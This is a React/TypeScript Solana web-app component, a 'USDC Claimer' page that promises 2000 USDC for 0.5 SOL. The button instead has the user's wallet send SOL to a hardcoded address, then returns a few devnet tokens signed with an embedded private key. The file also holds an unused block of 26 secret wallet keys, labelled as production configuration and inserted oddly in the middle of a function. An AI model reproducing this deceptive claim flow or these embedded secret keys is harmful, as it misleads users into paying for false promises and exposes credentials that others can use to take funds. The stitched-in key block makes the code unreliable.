/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "3X1pT4RSrQpe9geUzCKavnQDNG6SKuHdN7pZAJMyifRhpg1nrYjDqwMNHZZXB2nFzK2gEfwwhwKX6mc6uxkYAabb"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "5vuHMmv4kgsk32apNwM7zcTwPChT5j7LTndJiGLL6xDKG94cZ51T9m1sawpYbhLXM1ycYggSVrWTDiGsSe7myxKa",
  "key1": "2BmguYWPiuC3GicqCVKW4kBtFcCBBiSMxfKNFfzm1PWg86tv1CxbEa8yJxLuPHY5a65Atdgk3uMJbJ8LRT6UpFPi",
  "key2": "5D7nPN43ZccXgjwisq99BhgSZJmgU964H6iJCvtmckRGKw63MXh9JvrXDmUryGzygXg9TGUKkXcU4o2ewCrmCeyj",
  "key3": "4fXwJ9Y8r49Bwwig75qghTMjDg3M1ENZRBfNf5mUNB8RdZPQfWdfkqutPcgQAc1h3Vk8p25PCGM4br3DfZZpDdGY",
  "key4": "2QcHkak4eA3xyTJNL1PmC5fssw2MBSARgADhuoeqcLrRs4gA12Yfi8d7TtuyPL9QbP5ZX1oNxG6JZSxbD2QFkYhs",
  "key5": "tKReuUEmLpxPug4L7J7sGYcVmWMrF1buijmaUMjpSykk24xLyKvAPvSZUk34qasV2TPHfyjQ85MkrKXePGeWzPj",
  "key6": "EczjAjeJ3w4sC4UJf42Lo2geZigfhsjx8Thv8rgMeNksqdcEdPvp7LE67DeZoXKYncBydPfdB95zxbDiDZipcce",
  "key7": "2Pzr4kTe9ZEWNHQVKW45fqxHVX68NAb4eRKCMyfm5kG5jSZkwPANZPPghtKyYpaefRn4y4vyfi5cBTRG7xa6TBDd",
  "key8": "62RoCtwPcPkznVtpbXKt2djgE5QVYXqtj8e6aKZLLhESePA2dxo7WrxsNLb3YMJeUTNaA9GKtNj6DU1iu8epX6Fy",
  "key9": "51Uy5oe54m5e3iLLmSbMS7WTKZG2SjNMUx8N8HF6EiPJ4AxDkYRwvq2zepMeVaPawbdYaVjb9VtgbDRjzh7aT9A7",
  "key10": "kF23JSvg11m6UrbjqL51XytQVKZXBGmzj1gGZamncUNGgLhM1nAZpcoi3H4v8ivYaJrVmdXzBX3Bh26hiB4PuGE",
  "key11": "4dfGwaZhGtZJpk4nYntuUxc6TWRrTkUJ3T3ACWtEXvSwJHJEgxLvLfcSJUv4JvnEtUMgP3itVqwBBL7XozjG8rpu",
  "key12": "36kCQge2YqMwgVRHe3wEksHCB1chfCkDccn7gcx1FbYtCjMnmhWJFtfTYfvGsMju2RqyGE63eHyLYCPc72qxvAMn",
  "key13": "o5WsGuJnkRTncJPMZonLgdJwWywHD4jZK5r5BhnjK7EyuDH6rPbKuV9CCjGcMNq1iPoNyMUw3V4s4x1osfahF7Z",
  "key14": "3k8KmaspBzD11gBBYLWxauzuwBmX5GUp5WsjrH2W1MRX3kMAZZjJJj1gfxXcEnkkbmJZiBAL7AHA9QmLPjVwF3ME",
  "key15": "41ZL1oUSm7ngo4gAwo7TNXg9dg2Z7Eiu9tfYUfZYy1s5kFW9zMTy6QaPHEuZr3GM1HVvUhWBt6Vr2wbG6mHBsWQM",
  "key16": "5kVvGQtE3pL2FzZ7ffRrV3B1G9sKuTKp1R5Yu8QHq9ZEvom7P9x4MJvhbBoXnsHeyYFUvber4FjSDBZMKstaE871",
  "key17": "MJRu9nb5ZTS6VoXkNuqSQwd7vB1ti8RZgDuLt9cwGdJSLG91hG1CroWf9c5ZcPfAqnhrKS6zzHNpt9WFErk8Jrn",
  "key18": "4whUkSfHEmxVZ9gDaCMhGKdjWwpy7cSFkmqkETWZHdKAQYJ8zrfagd5i7nZccABoJvwb5Nys5UX4vULLZfw6S84d",
  "key19": "2qJYG9HFzgtjNE432eULBTxa11hBrR1oxjXWMJX7WePm8sPafReZzKcwcw2SjUHFnWS8g5dLXFEVQJqD5ESJpJ7z",
  "key20": "5wcAVoxykcP955nkamboQkhj3VeMekGcxVAk8FEAVPGQvuKQF2bxFV76uccwg9YQq5hP1Jw62qSmihJBC8zDeoTJ",
  "key21": "5KXZr1n8MmFkeVKwVBavjd1W5kYwKT3aVK5gRf9stjQKc7a3PHLu2e7ieCLC6vBg4FkLLfUGfFnS2mbWEKhJcbWp",
  "key22": "5vzXu3ApYyj6gbfL1R7DxEH1am7DhtFSc6JSamnkjsQhACzX84jaTi3Trdtndf7WH3cm6V4s9wQB6cjdKLVjLaQh",
  "key23": "4zLJVBorGUtfuEqWRVviAEdTs1ksrYPPuTsotWPRSvDF54cu2BwHfs5WgGzDtWQSN7pzx4SSMQTsHZsWj6B5zM6",
  "key24": "3qBi16rZSRo18u5G1ZNc14Uoz9FjhL6DCcfAqjwhZyp1k6UWiKyPePMbucZ1kfuyXhbSzFzijRFbMMUH1NcrWNDH",
  "key25": "4k9GZmG5yWEb3Q2Ljj6StF2qEZgSkMosZ632jjRFei9mDFPfgX4a5mw5N49trxbBxKEBivdfqc29sq2DEEZqhGDo"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
